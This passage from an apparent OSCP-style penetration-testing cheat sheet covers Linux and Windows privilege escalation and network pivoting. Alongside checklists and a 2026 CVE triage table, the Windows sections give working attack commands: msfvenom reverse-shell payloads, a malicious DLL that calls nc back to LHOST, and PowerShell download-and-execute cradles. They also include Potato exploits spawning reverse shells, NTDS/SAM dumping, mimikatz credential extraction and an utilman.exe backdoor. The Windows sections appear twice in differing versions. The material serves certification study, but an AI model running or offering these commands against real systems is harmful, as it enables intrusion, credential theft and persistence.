       +-- Does it load another object?
       |       +-- YES → library/config/module hijack
       |
       +-- Does it create/use a predictable temporary file?
               +-- YES → symlink/TOCTOU investigation
```


</details>


<details>


<summary>⏰ 12.16 Cron, Timers & Scheduled Jobs</summary>






``` bash
cat /etc/crontab
ls -la /etc/cron.d
ls -la /etc/cron.daily
ls -la /etc/cron.hourly
ls -la /etc/cron.weekly
crontab -l 2>/dev/null
```

Use pspy:

``` bash
./pspy64
```

Check:

-   [ ] Root-owned script writable
-   [ ] Parent directory writable
-   [ ] Relative executable
-   [ ] Weak PATH
-   [ ] Wildcard expansion
-   [ ] User-controlled environment
-   [ ] Predictable temp file
-   [ ] Symlink/TOCTOU
-   [ ] Backup/archive command

Also check systemd timers in **12.19**.


</details>


<details>


<summary>🛤️ 12.17 PATH Hijacking</summary>






Find relative execution:

``` bash
strings /path/to/binary | grep -v '/'
strace -f -e trace=execve /path/to/binary 2>&1
ltrace /path/to/binary 2>&1
```

Then determine:

``` text
Which executable is resolved?
Who executes it?
What PATH is used?
Can an earlier PATH directory be written?
Can the privileged process be triggered?
```

Do not modify PATH blindly; first establish the exact execution context.


</details>


<details>


<summary>⚡ 12.18 Linux Capabilities</summary>






``` bash
getcap -r / 2>/dev/null
capsh --print
cat /proc/self/status | grep Cap
```

Prioritize:

``` text
cap_setuid
cap_dac_read_search
cap_dac_override
cap_fowner
cap_sys_admin
cap_sys_ptrace
cap_net_raw
```

Validate the binary and capability semantics before attempting
exploitation.

Reference: https://gtfobins.github.io/


</details>


<details>


<summary>⚙️ 12.19 Systemd, Services & Timers</summary>






``` bash
systemctl list-units --type=service --state=running
systemctl list-timers --all
systemctl list-unit-files
systemctl cat <service>
systemctl status <service>
```

Check:

-   [ ] Writable unit file
-   [ ] Writable `ExecStart` target
-   [ ] Writable `EnvironmentFile`
-   [ ] Writable `WorkingDirectory`
-   [ ] Relative executable
-   [ ] Writable script/binary
-   [ ] Writable parent directory
-   [ ] Timer executes attacker-controlled content
-   [ ] Service restart/start permissions

``` bash
find /etc/systemd /lib/systemd /usr/lib/systemd -writable -ls 2>/dev/null
```


</details>


<details>


<summary>🌐 12.20 NFS / RPC / Network Filesystems</summary>






``` bash
cat /etc/exports 2>/dev/null
showmount -e <TARGET>
rpcinfo -p <TARGET>
mount
findmnt
```

Look for:

``` text
no_root_squash
rw
insecure
writable exports
unexpected mounts
```

If a writable export exists, determine whether the trust model permits
creation/modification of a privileged file.


</details>


<details>


<summary>🔑 12.21 SSH, Credentials & Secrets</summary>






``` bash
find /home /root -maxdepth 3 -type f \( \
  -name 'id_*' -o \
  -name 'authorized_keys' -o \
  -name '*.pem' -o \
  -name '*.key' -o \
  -name '.bash_history' -o \
  -name '.zsh_history' \
\) -ls 2>/dev/null
```

Search application/config locations:

``` bash
grep -RniE 'password|passwd|secret|token|api[_-]?key|private[_-]?key' \
  /home /opt /var/www /etc 2>/dev/null
```

Check:

``` text
~/.ssh/
~/.aws/
~/.config/
~/.docker/
.git/config
.env
backup archives
database configuration
CI/CD configuration
shell history
```


</details>


<details>


<summary>🧠 12.22 Processes, /proc, IPC & Secrets in Memory</summary>






``` bash
ps auxww
ps -ef
ss -lntup

cat /proc/<PID>/cmdline
cat /proc/<PID>/environ 2>/dev/null
cat /proc/<PID>/status
ls -la /proc/<PID>/fd 2>/dev/null
```

Investigate:

-   [ ] Root process uses writable script
-   [ ] Credentials in arguments
-   [ ] Secrets in environment
-   [ ] Debug endpoints
-   [ ] UNIX sockets
-   [ ] D-Bus services
-   [ ] Shared temp files


</details>


<details>


<summary>🔌 12.23 D-Bus, Polkit & PackageKit</summary>






``` bash
busctl --system list 2>/dev/null
systemctl status polkit 2>/dev/null
systemctl status packagekit 2>/dev/null
pkcheck --version 2>/dev/null
```

Check:

-   [ ] PackageKit installed
-   [ ] Exact PackageKit version
-   [ ] Polkit installed
-   [ ] Exposed privileged D-Bus actions
-   [ ] Current user can invoke relevant actions
-   [ ] Exact CVE prerequisites satisfied

### 2026 CVE

**CVE-2026-41651 --- PackageKit:** NVD describes a TOCTOU issue in
PackageKit 1.0.2 through 1.3.4 that can allow an unprivileged local user
to install packages as root; patched in 1.3.5.

Reference: https://nvd.nist.gov/vuln/detail/CVE-2026-41651


</details>


<details>


<summary>📦 12.24 Snap, AppArmor & Security Frameworks</summary>






``` bash
snap version 2>/dev/null
snap list 2>/dev/null
aa-status 2>/dev/null
getenforce 2>/dev/null
sestatus 2>/dev/null
```

### 2026 Snapd CVEs to triage

-   **CVE-2026-3888:** snapd local privilege escalation; verify Ubuntu
    release and snapd version.
-   **CVE-2026-8933:** snap-confine privilege escalation affecting
    specific set-capabilities configurations; verify exact
    snapd/snap-confine version and configuration.
-   **CVE-2026-15226:** snap sandbox confinement issue involving setuid
    execution flags; relevant to affected snapd versions and sandbox
    context.

References:

-   https://nvd.nist.gov/vuln/detail/CVE-2026-3888
-   https://nvd.nist.gov/vuln/detail/CVE-2026-8933
-   https://nvd.nist.gov/vuln/detail/CVE-2026-15226


</details>


<details>


<summary>🐳 12.25 Containers, Docker, LXC & LXD</summary>






``` bash
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup
systemd-detect-virt 2>/dev/null
docker version 2>/dev/null
docker ps 2>/dev/null
ls -la /var/run/docker.sock 2>/dev/null
id
```

Check:

``` text
docker group
docker.sock permissions
privileged container
host PID namespace
host filesystem mounts
CAP_SYS_ADMIN
CAP_SYS_PTRACE
device access
LXC/LXD group membership
```

Key question:

> **What host resources does this container identity control?**


</details>


<details>


<summary>🔗 12.26 Wildcards, Symlinks & TOCTOU</summary>






### Wildcards

``` text
Privileged command
      ↓
Shell expands *
      ↓
Attacker can create option-like filename?
      ↓
Program interprets it as an option?
```

Inspect:

``` text
tar
rsync
cp
mv
chown
chmod
zip
7z
git
find
```

### Symlink

``` text
Privileged process
      ↓
Predictable path
      ↓
Attacker controls parent/file
      ↓
Can symlink redirect target?
```

### TOCTOU

``` text
check()
   ↓
time gap
   ↓
use()
```

If the attacker can change the object between check and use, investigate
a race condition.


</details>


<details>


<summary>🧩 12.27 Application / Language / Plugin Hijacking</summary>






Check:

``` bash
env | sort
echo "$PATH"
find / -name '*.so' -writable 2>/dev/null
find / -writable -type d 2>/dev/null
```

Look for:

``` text
LD_PRELOAD
LD_LIBRARY_PATH
RPATH
RUNPATH
PYTHONPATH
PERL5LIB
RUBYLIB
Node module paths
Java classpath
plugin directories
application-specific module loaders
```

ELF:

``` bash
readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /path/to/binary
```


</details>


<details>


<summary>🧱 12.28 Kernel / Driver / Package CVE Triage</summary>






``` bash
uname -a
uname -r
cat /etc/os-release
cat /proc/version
cat /boot/config-$(uname -r) 2>/dev/null
dpkg -l 2>/dev/null | head
rpm -qa 2>/dev/null | head
```

Decision tree:

``` text
Exact distro/build
      ↓
Exact kernel/package revision
      ↓
Architecture
      ↓
Required feature/module/config
      ↓
Mitigations
      ↓
Public reproducer
      ↓
Local exploitability
```

**Do not use:**

``` text
"Kernel is in vulnerable range" = "exploit will work"
```

Distro backports and configuration frequently change exploitability.

### 2026 Linux LPE/CVE references

  ----------------------------------------------------------------------
  CVE                    Component              Why it belongs in the
                                                checklist
  ---------------------- ---------------------- ------------------------
  CVE-2026-41651         PackageKit             Local root via
                                                PackageKit TOCTOU

  CVE-2026-3888          snapd                  Ubuntu local privilege
                                                escalation

  CVE-2026-8933          snap-confine           Configuration-specific
                                                local privilege
                                                escalation

  CVE-2026-15226         snapd/snap-confine     Sandbox confinement
                                                bypass

  CVE-2026-0271          Prisma Access Agent    Linux local privilege
                                                escalation if product is
                                                installed

  CVE-2026-58302         LinuxCNC `rtapi_app`   SUID-root shared-library
                                                loading leading to local
                                                root

  CVE-2026-43433         Linux kernel Binder    Kernel
                                                privilege-boundary
                                                issue; highly
                                                configuration/trigger
                                                dependent
  ----------------------------------------------------------------------

References:

-   https://nvd.nist.gov/vuln/detail/CVE-2026-41651
-   https://nvd.nist.gov/vuln/detail/CVE-2026-3888
-   https://nvd.nist.gov/vuln/detail/CVE-2026-8933
-   https://nvd.nist.gov/vuln/detail/CVE-2026-15226
-   https://nvd.nist.gov/vuln/detail/CVE-2026-0271
-   https://nvd.nist.gov/vuln/detail/CVE-2026-58302
-   https://nvd.nist.gov/vuln/detail/CVE-2026-43433


</details>


<details>


<summary>🧪 12.29 Kernel Exploit Decision Rule</summary>






Before compiling/running a kernel exploit:

-   [ ] Exact kernel version confirmed
-   [ ] Exact distro/build confirmed
-   [ ] Architecture confirmed
-   [ ] Required kernel feature present
-   [ ] Required module present
-   [ ] Exploit prerequisites satisfied
-   [ ] Mitigations considered
-   [ ] Public PoC/reproducer matches target
-   [ ] Non-kernel paths already checked
-   [ ] Recovery plan exists if the kernel crashes

**OSCP rule:** a reliable service/configuration privilege escalation is
normally preferable to a fragile kernel exploit.


</details>


<details>


<summary>🧠 12.30 Linux PrivEsc Decision Tree --- 60 Second Pass</summary>






``` text
LOW PRIV USER
    ↓
sudo -l
    ↓
SUID/SGID
    ↓
Capabilities
    ↓
Writable files/dirs
    ↓
Cron + systemd timers
    ↓
Services
    ↓
PATH / library / module hijack
    ↓
NFS / mounts / Docker / LXC
    ↓
Credentials / SSH / history / configs
    ↓
D-Bus / Polkit / PackageKit / snap
    ↓
Custom SUID/application
    ↓
Kernel/package CVE
```


</details>


------------------------------------------------------------------------


<details>


<summary>🤖 13.1 Automated Tools --- Run These First</summary>






``` powershell
.\winPEASx64.exe
.\Seatbelt.exe -group=all
.\SharpUp.exe audit
.\PrivescCheck.ps1
.\Watson.exe

whoami /all
whoami /priv
whoami /groups
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /svc
schtasks /query /fo LIST /v
net user
net localgroup administrators
```

Also know:

``` text
AccessChk
Process Explorer
Procmon
LOLBAS
SharpDPAPI
```


</details>


<details>


<summary>🛠️ 13.2 Services --- ACL + Binary + Registry + Path</summary>






``` powershell
Get-CimInstance Win32_Service |
  Select Name,StartMode,State,StartName,PathName

sc.exe query
sc.exe qc <SERVICE>
```

Check:

-   [ ] Unquoted service path
-   [ ] Writable executable
-   [ ] Writable parent directory
-   [ ] Weak service ACL
-   [ ] Weak registry ACL
-   [ ] Change-config/start permissions
-   [ ] SYSTEM service account
-   [ ] DLL/module dependencies

Use AccessChk to validate permissions rather than relying only on
WinPEAS.


</details>


<details>


<summary>📋 13.3 Scheduled Tasks & Autoruns</summary>






``` cmd
schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Check:

-   [ ] SYSTEM task
-   [ ] Writable executable/script
-   [ ] Writable working directory
-   [ ] DLL/module load
-   [ ] User-controlled arguments
-   [ ] Startup/logon trigger
-   [ ] Registry autorun binary writable


</details>


<details>


<summary>🥔 13.4 Token Impersonation / Potato Decision Tree</summary>






``` cmd
whoami /priv
whoami /groups
```

If relevant:

``` text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
        ↓
Windows build
        ↓
Service/RPC prerequisites
        ↓
Select compatible technique
```

Know the families:

``` text
GodPotato
PrintSpoofer
RoguePotato
JuicyPotato
SweetPotato
```

Do not assume one Potato works on every Windows release.


</details>


<details>


<summary>🔌 13.5 Named Pipes / IPC</summary>






``` cmd
dir \\.\pipe\
```

PowerShell:

``` powershell
Get-ChildItem \\.\pipe\
```

Investigate:

-   [ ] Pipe name
-   [ ] Owning process
-   [ ] Security descriptor
-   [ ] Client/server role
-   [ ] Impersonation
-   [ ] Privileged service account
-   [ ] Triggerable privileged operation

Use Procmon/Process Explorer to correlate pipe activity with processes.


</details>


<details>


<summary>🔑 13.6 DPAPI / Credential Stores</summary>






Inspect:

``` text
Credential Manager
Windows Credential Files
DPAPI masterkeys
Browser credential stores
Saved RDP credentials
Application secrets
Certificates/private keys
```

Tools to know:

``` text
SharpDPAPI
Mimikatz dpapi::
Seatbelt
```

Mental model:

``` text
Credential blob
      ↓
DPAPI protection
      ↓
Masterkey
      ↓
User/machine/domain context
      ↓
Decryptable secret
```


</details>


<details>


<summary>💾 13.7 Windows Privileges --- Don't Stop at SeImpersonate</summary>






``` cmd
whoami /priv
```

Review:

``` text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeCreateSymbolicLinkPrivilege
```

For each privilege ask:

> What exact protected operation does this privilege permit in the
> current context?


</details>


<details>


<summary>🗄️ 13.8 LAPS / Local Administrator Credential Discovery</summary>






Check for:

``` text
Windows LAPS
Legacy Microsoft LAPS
Delegated read permissions
Computer-object password attributes
Password expiration metadata
```

In AD:

``` text
Who can read the LAPS password?
Who can modify the computer object?
Does the current principal have delegated read rights?
```

Do not assume "LAPS exists" means the current user can read the
password.


</details>


<details>


<summary>📂 13.9 DLL / EXE / PATH Hijacking</summary>






Use:

``` cmd
where.exe <binary>
icacls <directory>
```

With Procmon look for:

``` text
NAME NOT FOUND
PATH NOT FOUND
ACCESS DENIED
```

Check:

``` text
DLL search order
Writable application directories
Writable PATH directories
Missing DLLs
Side-loading
Unquoted paths
Writable working directories
```


</details>


<details>


<summary>🧬 13.10 Registry / ACL / File Permission Methodology</summary>






``` cmd
reg query HKLM\SOFTWARE
reg query HKCU\SOFTWARE
icacls "C:\path"
```

Ask:

``` text
Can I modify the executable?
Can I modify its parent directory?
Can I change the service configuration?
Can I modify a registry value that a privileged process consumes?
Can I influence a DLL/config/plugin?
```


</details>


<details>


<summary>🔐 13.11 SeBackup / SeRestore / Sensitive File Access</summary>






Relevant privileges:

``` text
SeBackupPrivilege
SeRestorePrivilege
```

Investigate whether the context allows access to:

``` text
SAM
SYSTEM
SECURITY
NTDS.dit
shadow copies
protected application files
registry hives
```

The key is to understand the privilege's semantics rather than
memorizing a single command.


</details>


<details>


<summary>💣 13.12 Kernel / Driver CVE Triage</summary>






``` cmd
systeminfo
wmic qfe list brief
driverquery /v
```

Workflow:

``` text
OS name
  ↓
Build number
  ↓
Patch level
  ↓
Installed drivers
  ↓
Exact affected build
  ↓
Exploit prerequisites
  ↓
Mitigations
  ↓
Public PoC
```

Use Microsoft MSRC + NVD + vendor advisories.


</details>


<details>


<summary>📌 13.13 2026 Windows / AD CVE Reference --- Validate Before Use</summary>






  ----------------------------------------------------------------------
  CVE                    Area                   Checklist action
  ---------------------- ---------------------- ------------------------
  CVE-2026-26128         Windows SMB Server     Verify exact Windows
                                                build and SMB context

  CVE-2026-62752         Windows Kerberos       Verify exact build and
                                                required authentication
                                                context

  CVE-2026-62773         Windows Kerberos       Verify exact build and
                                                trigger conditions

  CVE-2026-62766         Windows Kerberos       Verify exact build and
                                                trigger conditions

  CVE-2026-27912         Windows Kerberos       Check
                                                network/authentication
                                                prerequisites

  CVE-2026-47288         Windows Kerberos       Check adjacent-network
                                                prerequisites

  CVE-2026-54121         AD CS                  Check
                                                certificate-service
                                                configuration

  CVE-2026-55001         Active Directory       Check affected AD
                                                configuration/build
  ----------------------------------------------------------------------

Primary sources:

-   https://msrc.microsoft.com/
-   https://nvd.nist.gov/

> Keep this as a triage index. Do not infer exploitability from a CVE
> title.


</details>


<details>


<summary>🧠 13.14 Windows PrivEsc Decision Tree</summary>






``` text
LOW PRIV USER
    ↓
whoami /priv + groups
    ↓
Services
    ↓
Scheduled Tasks
    ↓
Writable Files / Directories
    ↓
Registry / Autoruns
    ↓
DLL / EXE / PATH Hijacking
    ↓
Named Pipes / IPC
    ↓
Token impersonation
    ↓
DPAPI / Credential Stores
    ↓
LAPS / Local Admin Secrets
    ↓
Backup/Restore/Debug privileges
    ↓
Drivers / Kernel CVE
```


</details>


------------------------------------------------------------------------

## 13. PRIVILEGE ESCALATION --- WINDOWS (EVERY VECTOR)


<details>


<summary>🤖 13.1 Automated Tools --- Run These First</summary>






``` powershell
# ── WINPEAS (BEST for Windows) ────────────────────────────────
.\winPEASx64.exe
.\winPEASx86.exe           # 32-bit systems
.\winPEASany.exe | Tee-Object winpeas.txt

# ── POWERUP ───────────────────────────────────────────────────
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerUp.ps1')
Invoke-AllChecks | Out-File -Encoding ASCII powerup_results.txt

# ── SEATBELT ──────────────────────────────────────────────────
.\Seatbelt.exe -group=all
.\Seatbelt.exe CredEnum WindowsCredentialFiles TokenPrivileges

# ── SHARPUP ───────────────────────────────────────────────────
.\SharpUp.exe audit

# ── WATSON (patch-based privesc) ──────────────────────────────
.\Watson.exe    # Shows exploitable missing patches

# ── QUICK MANUAL CHECK ────────────────────────────────────────
whoami /priv
whoami /groups
net user %username%
net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe list brief | tail   # Last few patches installed
```


</details>


<details>


<summary>🛤️ 13.2 Service Exploits</summary>






``` cmd
REM ── UNQUOTED SERVICE PATH ────────────────────────────────────
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
REM PowerShell:
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName,StartMode

REM Example: C:\Program Files\Vulnerable App\service.exe
REM Try placing payload at: C:\Program.exe
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o "C:\Program.exe"
sc start VulnService

REM ── WEAK SERVICE PERMISSIONS ──────────────────────────────────
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *
.\accesschk.exe /accepteula -uwcqv Users *
REM If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config VulnService binPath= "C:\Users\Public\shell.exe"
sc stop VulnService && sc start VulnService

REM ── WRITABLE SERVICE BINARY ────────────────────────────────────
icacls "C:\path\to\service.exe"
REM If (W) write access:
copy /y shell.exe "C:\path\to\service.exe"
sc stop VulnService && sc start VulnService
```


</details>


<details>


<summary>📋 13.3 Registry & AlwaysInstallElevated</summary>






``` cmd
REM ── ALWAYSINSTALLELEVATED ──────────────────────────────────────
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REM Both = 0x1 → create malicious MSI:
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

REM ── AUTORUNS WITH WEAK PERMS ───────────────────────────────────
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
REM Check if any listed binary is writable:
icacls "C:\path\to\autorun.exe"
REM If writable → replace with shell

REM ── AUTOLOGON CREDENTIALS ──────────────────────────────────────
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```


</details>


<details>


<summary>🥔 13.4 Token Impersonation --- Potato Attacks</summary>






``` powershell
# ── CHECK PRIVILEGES ──────────────────────────────────────────
whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"
# These are held by: IIS AppPool, MSSQL Service, Network Service accounts

# ── GODPOTATO (most universal — Windows 2012+) ────────────────
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\Users\Public\nc.exe LHOST LPORT -e cmd"

# ── PRINTSPOOFER (Windows 10 / Server 2016, 2019) ─────────────
sc query Spooler    # Must be running
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\Users\Public\nc.exe LHOST LPORT -e cmd"

# ── JUICYPOTATO (Windows < 10 1809 / Server 2016 and older) ───
# Need CLSID for OS: https://github.com/ohpe/juicy-potato/tree/master/CLSID
.\JuicyPotato.exe -l 1337 -p "cmd.exe" -a "/c net localgroup administrators user /add" -t * -c {CLSID}

# ── ROGUEPOTATO (Windows 10 1809+ / Server 2019) ──────────────
.\RoguePotato.exe -r LHOST -e "C:\Users\Public\nc.exe LHOST LPORT -e cmd" -l 9999

# ── SWEETPOTATO (combined) ────────────────────────────────────
.\SweetPotato.exe -a "whoami"
.\SweetPotato.exe -e EfsRpc -p C:\Users\Public\nc.exe -a "LHOST LPORT -e cmd"
```


</details>


<details>


<summary>💾 13.5 Sensitive Privilege Abuse</summary>






``` powershell
# ── SeBackupPrivilege → SAM/NTDS dump ────────────────────────
# Dump with diskshadow:
Set-Content -Path C:\Windows\Temp\s.dsh -Value "set context persistent nowriters`nadd volume c: alias tmp`ncreate`nexpose %tmp% z:"
diskshadow.exe /s C:\Windows\Temp\s.dsh
robocopy /b z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# Transfer to Kali → impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# ── SeRestorePrivilege → write any file ───────────────────────
# Overwrite utilman.exe with cmd.exe:
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# At Windows login screen → Win+U → cmd as SYSTEM

# ── SeDebugPrivilege → dump LSASS ────────────────────────────
# Mimikatz uses this:
privilege::debug
sekurlsa::logonpasswords

# ── SeLoadDriverPrivilege → kernel driver ────────────────────
# Load vulnerable signed driver (e.g. Capcom.sys) → SYSTEM
```


</details>


<details>


<summary>📂 13.6 DLL Hijacking</summary>






``` bash
# ── FIND MISSING DLL OPPORTUNITIES ───────────────────────────
# Use Procmon on Windows: filter Result=NAME NOT FOUND + .dll in path
# Or use winpeas output which lists writable directories in PATH

# ── CREATE MALICIOUS DLL ─────────────────────────────────────
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o missing.dll

# C template (more reliable):
cat > evil.c << 'EOF'
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH)
        system("cmd /c \"C:\\Users\\Public\\nc.exe LHOST LPORT -e cmd\"");
    return TRUE;
}
EOF
x86_64-w64-mingw32-gcc -shared -o missing.dll evil.c -lws2_32

# DLL SEARCH ORDER (Windows):
# 1. Application directory  ← most common hijack location
# 2. System directory (C:\Windows\System32)
# 3. Windows directory (C:\Windows)
# 4. Current directory
# 5. PATH directories
```


</details>


<details>


<summary>📋 13.7 Windows Kernel CVEs</summary>






``` powershell
# ── CHECK PATCH LEVEL ─────────────────────────────────────────
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe list brief    # Last patch applied date

# ── WATSON / SHERLOCK ─────────────────────────────────────────
.\Watson.exe
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Sherlock.ps1'); Find-AllVulns

# ── KEY EXPLOITS ──────────────────────────────────────────────
# MS16-032 — Win7-10 / 2008-2012R2:
Invoke-MS16032 -Application cmd.exe -commandline "/c net user pwn3d P@ssw0rd! /add && net localgroup administrators pwn3d /add"

# CVE-2021-1675 / CVE-2021-34527 — PrintNightmare (All Windows):
python3 CVE-2021-1675.py domain/user:pass@IP '\\LHOST\share\evil.dll'

# CVE-2020-0796 — SMBGhost (Win10 1903/1909 — not 2004+):
# Local LPE only (not remote — don't confuse versions)

# CVE-2022-21999 — SpoolFool (Win10/Server with Print Spooler):
.\SpoolFool.exe -dll evil.dll
```


</details>


------------------------------------------------------------------------

## 14. LATERAL MOVEMENT & PIVOTING

> **2026 rule:** every pivot changes your attack surface. Re-enumerate
> instead of assuming the old network view still applies.


<details>


<summary>🔄 14.1 Re-Enumeration After Every Foothold/Pivot</summary>






Linux:

``` bash
ip addr
ip route
ip neigh
cat /etc/hosts
cat /etc/resolv.conf
ss -lntup
```

Windows:

``` cmd
ipconfig /all
route print
arp -a
netstat -ano
```

Then re-check:

-   [ ] New interfaces
-   [ ] New routes
-   [ ] Internal DNS
-   [ ] Internal hostnames
-   [ ] New SMB/LDAP/RDP/WinRM services
-   [ ] Local-only web applications
-   [ ] New credentials
-   [ ] New domain relationships


</details>


<details>


<summary>🚇 14.2 Modern Pivot Tool Selection</summary>






``` text
Need routed access / multiple internal services?
    → Ligolo-ng

Need simple TCP tunneling?
    → Chisel

Have SSH?
    → SSH local/remote forwarding or SOCKS

Need one service exposed?
    → SSH -L / socat
```

Tools:

``` text
Ligolo-ng
Chisel
SSH
socat
proxychains
```

Do not assume proxychains + Nmap gives the same results as direct
scanning. Prefer service-aware enumeration when operating through a
SOCKS pivot.


</details>


<details>


<summary>🗺️ 14.1 Pivoting Overview</summary>






    SCENARIO:
    [Kali] ──VPN──► [DMZ / Pivot Host] ──internal──► [Target Network]

    TOOL SELECTION:
      SSH available on pivot?          → SSH tunnels (fastest setup)
      Only HTTP/S reachable?           → Chisel (HTTP tunnel)
      Want transparent routing?        → Ligolo-ng (BEST for OSCP)
      Quick single port forward?       → Socat
      Windows pivot, no SSH client?    → plink.exe or chisel.exe
      Multiple pivots needed?          → Ligolo-ng chains

    proxychains vs ligolo-ng:
      proxychains: routes through SOCKS proxy — some tools don't support it
      ligolo-ng:   adds a real route to your routing table — every tool works!


</details>


<details>


<summary>⚡ 14.2 Ligolo-ng --- Best OSCP Pivot Tool</summary>



**Version snapshot (06 Sep 2026):** Ligolo-ng 0.9.1 retains the explicit
`interface_create` → `tunnel_start` → `interface_add_route` flow below.
Versions 0.8+ also provide `autoroute`, but the explicit route sequence remains
easy to audit and recover. Installed console help always wins.





``` bash
# ── ATTACKER: START PROXY ─────────────────────────────────────
./proxy -selfcert -laddr 0.0.0.0:11601

# In the proxy console, create the interface and print the TLS fingerprint:
interface_create --name ligolo
certificate_fingerprint

# ── DEPLOY AGENT ON PIVOT HOST ────────────────────────────────
# Replace FINGERPRINT with the exact value printed by the proxy.
chmod +x agent && ./agent -connect LHOST:11601 -accept-fingerprint FINGERPRINT
.\agent.exe -connect LHOST:11601 -accept-fingerprint FINGERPRINT

# ── CONFIGURE TUNNEL (in proxy console) ───────────────────────
session
# Select the pivot session interactively, inspect its networks, then:
ifconfig
tunnel_start --tun ligolo

# ── ADD ONLY VERIFIED, IN-SCOPE ROUTES ────────────────────────
interface_add_route --name ligolo --route 192.168.100.0/24
interface_add_route --name ligolo --route 10.10.10.0/24

# Manual route fallback if the managed command is unavailable:
# sudo ip route add 192.168.100.0/24 dev ligolo

# ── NOW ACCESS INTERNAL DIRECTLY ─────────────────────────────
nmap 192.168.100.0/24                   # Direct scan!
evil-winrm -i 192.168.100.10 -u user -p pass
impacket-psexec domain/user:pass@192.168.100.10

# ── CATCH REVERSE SHELLS FROM INTERNAL ───────────────────────
# In the selected proxy session — add listener:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Now: internal machine connects to pivot:4444 → arrives at your Kali:4444

# ── DOUBLE PIVOT (Pivot1 → Pivot2 → Target) ──────────────────
# On Pivot2, run agent connecting to Pivot1 address
# Add second session in ligolo, add routes for deeper network
```

`-ignore-cert` disables verification and is only an emergency debugging fallback. Prefer the exact certificate fingerprint. If your installed syntax differs, stop and read local `-h` / console help before changing the network hypothesis.


</details>


<details>


<summary>🔧 14.3 Chisel --- HTTP Tunneling</summary>






``` bash
# ── SOCKS PROXY ───────────────────────────────────────────────
# Attacker (server):
./chisel server -p 8000 --reverse

# Pivot (client):
./chisel client LHOST:8000 R:socks      # SOCKS5 on attacker:1080
# Windows:
.\chisel.exe client LHOST:8000 R:socks

# Configure proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 22,80,445 192.168.x.0/24
proxychains evil-winrm -i 192.168.x.10 -u user -p pass

# ── PORT FORWARD ──────────────────────────────────────────────
./chisel client LHOST:8000 R:8080:192.168.x.10:80
# Now: http://localhost:8080 → reaches internal 192.168.x.10:80
```


</details>


<details>


<summary>🔀 14.4 SSH Tunneling --- All Types</summary>






``` bash
# ── LOCAL PORT FORWARD (access internal service) ──────────────
ssh -L 8080:192.168.x.10:80 user@PIVOT -N
# → curl http://127.0.0.1:8080  reaches 192.168.x.10:80

# Multiple forwards:
ssh -L 8080:10.0.0.10:80 -L 3306:10.0.0.10:3306 user@PIVOT -N

# ── DYNAMIC SOCKS PROXY ───────────────────────────────────────
ssh -D 1080 user@PIVOT -N -f    # -f = background
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.0.0.0/24

# ── REMOTE PORT FORWARD (catch shell from internal) ───────────
ssh -R 4444:127.0.0.1:4444 user@PIVOT -N
# Internal machine sends rev shell to pivot:4444 → arrives at Kali:4444

# ── KEEP ALIVE / BACKGROUND ───────────────────────────────────
ssh -L 8080:10.0.0.10:80 user@PIVOT -N -f -o ServerAliveInterval=60
```


</details>


<details>


<summary>🔌 14.5 Socat & Quick Methods</summary>






``` bash
# ── SOCAT PORT FORWARD ────────────────────────────────────────
socat TCP-LISTEN:8080,fork TCP:192.168.x.10:80 &
socat TCP-LISTEN:4444,fork TCP:LHOST:5555 &     # Rev shell relay

# ── PLINK (Windows, GUI-less PuTTY) ──────────────────────────
# Download plink.exe to Windows pivot
plink.exe -l user -pw pass -R 4444:127.0.0.1:4444 LHOST
plink.exe -l user -pw pass -D 1080 LHOST              # SOCKS

# ── NETCAT RELAY (when nothing else works) ────────────────────
mkfifo /tmp/pipe
nc -lvp 8080 < /tmp/pipe | nc 192.168.x.10 80 > /tmp/pipe &
```


</details>


<details>


